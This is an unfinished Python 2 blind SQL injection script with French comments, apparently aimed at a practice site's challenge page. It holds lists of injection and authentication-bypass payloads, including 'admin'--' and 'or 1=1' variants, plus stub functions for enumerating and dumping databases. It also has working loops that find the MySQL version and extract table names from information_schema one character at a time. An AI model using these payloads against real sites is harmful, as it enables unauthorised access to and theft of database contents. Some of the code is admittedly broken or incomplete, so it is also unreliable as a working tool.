#!/usr/bin/python2
# -*- coding: utf-8 -*-

import re
import os
import string
import sys, getopt
import urllib2, requests
from optparse import OptionParser

# --------- Variables ----------

l_injnum = ["'", "1+1", "3-1", "1 or 1 = 1", "1) or (1 = 1", "1 and 1 = 2", "1) and (1 = 2", "1 or 'ab' = 'a' + 'b'", "1 or 'ab' = 'a''b", "1 or 'ab'='a'||'b'", "' and 'x'='p'#"]
l_bypass = ["admin'--", "admin'#", "1--", "1 or 1 = 1--", "' or '1'='1'--", "-1 and 1=2", "' and '1'='2'--", "1/* comment */"]
l_bypass2 = ["admin')--", "admin')#", "1)--", "1) or 1 = 1--", "') or '1'='1'--", "-1) and 1=2", "') and '1'='2'--"]
alphabet = "abcdefghijklmnopqrstuvwxyz"

# --------- Main function option parsing ----------
def main():
    arg_help = """Blind SQLi:
python sql.py TODO include args
python sql.py TODO include args"""

    parser = OptionParser(usage=arg_help)
    try:
        parser.add_option("-u", "--url", action="store", type=str, dest="URL", help="The target url to inject")
        parser.add_option("-d", "--detect-bypass", action="store_true", dest="BYPASS_DETECT", help="Detect the bypass to use during injection")
        parser.add_option("-e", "--enum", action="store_true", dest="ENUM", help="Enumerate databases, tables columns")
        parser.add_option("-D", "--dump", action="store_true", dest="DUMP", help="Dump the chosen database")
        parser.add_option("-b", "--database", action="store", type=str, dest="DATABASE", help="The database to dump")
    except optparse.AmbiguousOptionError as ambiguous:
        print("Ambiguous option: " + ambiguous)
    except optparse.BadOptionError as bad_option:
        print("Bad option: " + bad_option)

    # Affect options argument to variables
    (options, args) = parser.parse_args()

    URL                 = options.URL
    BYPASS_DETECT       = options.BYPASS_DETECT
    ENUM                = options.ENUM
    DUMP                = options.DUMP
    DATABASE            = options.DATABASE

    # TODO algo principal ici

# --------- Find the proper bypass ----------
def find_bypass():
    pass

# --------- Find the numer of columns ----------
def find_nb_columns():
    pass

# --------- Find SQL database version ----------
def sql_version():
    pass

# --------- Find the current database ----------
def current_database():
    pass

# --------- Enumerate databases ----------
def eunum_databases():
    pass

# --------- Enumerate database tables ----------
def enum_tables():
    pass

# --------- Dump the database ----------
def exfiltrate_data():
    pass

# --------- Contruct & send HTTP requests ----------
def request_handler():
    pass

if __name__ == "__main__":
    main()

"""def main(argv):
# ---- /!\
   try:
      opts, args = getopt.getopt(argv,"hi:o:",["ifile=","ofile="])
   except getopt.GetoptError:
      print 'test.py -i <inputfile> -o <outputfile>'
      sys.exit(2)
# ---- /!\
   for opt, arg in opts:
      if opt == '-h':
         print "help"
         sys.exit()
     elif opt in ("-i", "--ifile"): #conditions
         # actions
     elif opt in ("-o", "--ofile"): #conditions
         # actions
"""

# ----- Chose the mode -----------
# url ou paramètres ?

# ---- If url --------------
url = "http://leettime.net/sqlninja.com/tasks/blind_ch1.php?id=1"

# changer session, inutile
with requests.session() as session:
    page = session.get(url)
    htmlpage = page.content
    print "Page 1\n", htmlpage, "\n"
    htmlpage2 = ""
    #    l_diff = []
    for elem in l_injnum:
        urli = url + " " + elem
        page = requests.get(urli)
        htmlpage2 = page.content
        if ( htmlpage != htmlpage2 ):
            break
            #l_diff.append(elem)
    print elem

    for i in range(4,7):
        urli = url + "' and "  + "substring(@@version,1,1)>=" + str(i) + " or '"
        page = requests.get(urli)
        htmlpage_version = page.content
        if htmlpage2 == htmlpage_version:
            break
    if (i - 1 == 5 ):
        print "Ok, version 5, on peut continuer"

# cette partie ne fonctionne pas :(
    table = ""
    for i in range (1,6):
        for lettre in alphabet:
#            urli = url + "' and "  + "ascii(substring((SELECT schema_name FROM information_schema.schemata LIMIT 0,1)," + str(i) +",1))>=" + str(ord(lettre)) + " or '"
            urli = url + "' and "  + "ascii(substring((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)," + str(i) +",1))>=" + str(ord(lettre)) + " or '"
            print urli
            page = requests.get(urli)
            htmlpage_table = page.content
            #if htmlpage2 == htmlpage_table:
            if re.search('Get lost',htmlpage_table):
                print "\nGet lost\n"
            if re.search('Your are welcome',htmlpage_table):
                print "\nYour are welcome\n"
            if htmlpage != htmlpage_table:
                print lettre
                table = table + lettre
                break
        print i
    print table


"""
Test utilisation de dual
   dual = ""
    for i in range (1,6):
        dual = dual + '_'
        urli = url + "' and " + "(select 1 from dual where user() LIKE '" + dual + "')" + " or '"
        print urli
        page = requests.get(urli)
        htmlpage_dual = page.content
        print "Page 2\n", htmlpage_dual, "\n"
        if htmlpage == htmlpage_dual:
            break
    print i
        """
